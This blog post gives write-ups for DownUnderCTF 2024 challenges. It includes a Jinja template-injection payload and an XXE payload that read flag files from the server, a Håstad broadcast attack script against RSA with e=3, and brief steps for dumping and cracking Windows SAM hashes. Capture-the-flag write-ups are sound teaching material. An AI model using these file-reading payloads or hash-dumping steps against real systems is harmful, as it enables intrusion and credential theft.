---
title: 'down-under ctf 2024 challenges'
description: 'Solutions I did for down-under 2024'
pubDate: 'Jul 01 2024'
heroImage: 
  src: '/blog-placeholder-1.jpg'
  alt: ''
order: 1
tags: ["writeup"]
---

# Background Information

Competed as team Lazy Bums. Sort of lost interest a day in. 

## Web

#### Parrot The Emu
This code is vulnerable to user-supplied malicious payloads

```python
user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input)
```

{{7*7}} verifies that the code is vulnerable to template injection as it returns 49, which means that the server is processing the inputted template

Sending the payload: ```{{ self.__init__.__globals__.__builtins__.open('flag').read() }}``` will return the flag as it reads the flag file defined in the supplied source code files.

#### Zoo Feedback Form
Upon inspecting the code, we can see that XML is used in the post request sent to the web server

```python
if request.method == 'POST':
        xml_data = request.data
        try:
            parser = etree.XMLParser(resolve_entities=True)
            root = etree.fromstring(xml_data, parser=parser)
        except etree.XMLSyntaxError as e:
            return render_template_string('<div style="color:red;">Error parsing XML: {{ error }}</div>', error=str(e))
        feedback_element = root.find('feedback')
        if feedback_element is not None:
            feedback = feedback_element.text
            return render_template_string('<div style="color:green;">Feedback sent to the Emus: {{ feedback }}</div>', feedback=feedback)
        else:
            return render_template_string('<div style="color:red;">Invalid XML format: feedback element not found</div>')

    return render_template('index.html')
```

Load the web server onto burpsuite.

Inspect the post request, you can see that it sends an XML request. This must mean it can be vulnerable to XXE injection

You can see that an XML request is sent, so we can modify it using a basic XXE injection where we read ```flag.txt``` through an XML entity object

```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/app/flag.txt"> ]>
<root>
  <feedback>
    a&example;
  </feedback>
</root>
```

Upon sending, we get the flag. 

## Crypto
#### ShuffleBox
Let's look at the provide files.

```bash
aaaabbbbccccdddd -> ccaccdabdbdbbada
abcdabcdabcdabcd -> bcaadbdcdbcdacab
???????????????? -> owuwspdgrtejiiud
```

#### Sun Tzu's Perfect Math Class
Just use chatgpt to solve the riddle.

Solve script for part 2:

```python
from sympy import mod_inverse
from gmpy2 import iroot

# Given values
e = 3
c1 = int("105001824161664003599422656864176455171381720653815905925856548632486703162518989165039084097502312226864233302621924809266126953771761669365659646250634187967109683742983039295269237675751525196938138071285014551966913785883051544245059293702943821571213612968127810604163575545004589035344590577094378024637")
c2 = int("31631442837619174301627703920800905351561747632091670091370206898569727230073839052473051336225502632628636256671728802750596833679629890303700500900722642779064628589492559614751281751964622696427520120657753178654351971238020964729065716984136077048928869596095134253387969208375978930557763221971977878737")
c3 = int("64864977037231624991423831965394304787965838591735479931470076118956460041888044329021534008265748308238833071879576193558419510910272917201870797698253331425756509041685848066195410586013190421426307862029999566951239891512032198024716311786896333047799598891440799810584167402219122283692655717691362258659")
n1 = int("147896270072551360195753454363282299426062485174745759351211846489928910241753224819735285744845837638083944350358908785909584262132415921461693027899236186075383010852224067091477810924118719861660629389172820727449033189259975221664580227157731435894163917841980802021068840549853299166437257181072372761693")
n2 = int("95979365485314068430194308015982074476106529222534317931594712046922760584774363858267995698339417335986543347292707495833182921439398983540425004105990583813113065124836795470760324876649225576921655233346630422669551713602423987793822459296761403456611062240111812805323779302474406733327110287422659815403")
n3 = int("95649308318281674792416471616635514342255502211688462925255401503618542159533496090638947784818456347896833168508179425853277740290242297445486511810651365722908240687732315319340403048931123530435501371881740859335793804194315675972192649001074378934213623075830325229416830786633930007188095897620439987817")

# Applying Chinese Remainder Theorem
N = n1 * n2 * n3
n1_inv = mod_inverse(N // n1, n1)
n2_inv = mod_inverse(N // n2, n2)
n3_inv = mod_inverse(N // n3, n3)

C = (c1 * n1_inv * (N // n1) + c2 * n2_inv * (N // n2) + c3 * n3_inv * (N // n3)) % N

m, exact = iroot(C, 3)
if exact:
    print(f"The hidden message is: {m}")
else:
    print("Failed to recover the hidden message.")
```

## Forensics
#### Baby's First Foren

Looking throughout the HTTP object yields the strange phrase `nikto`. Upon further research, nikto is a web vulnerability scanner

Following the tcp stream and searching for `nikto` yeilds the version.

#### SAM I AM

Use a tool like `samdump2 system.bak sam.bak` and get the password hashes. Then crack the NT hashes using `john` and get the password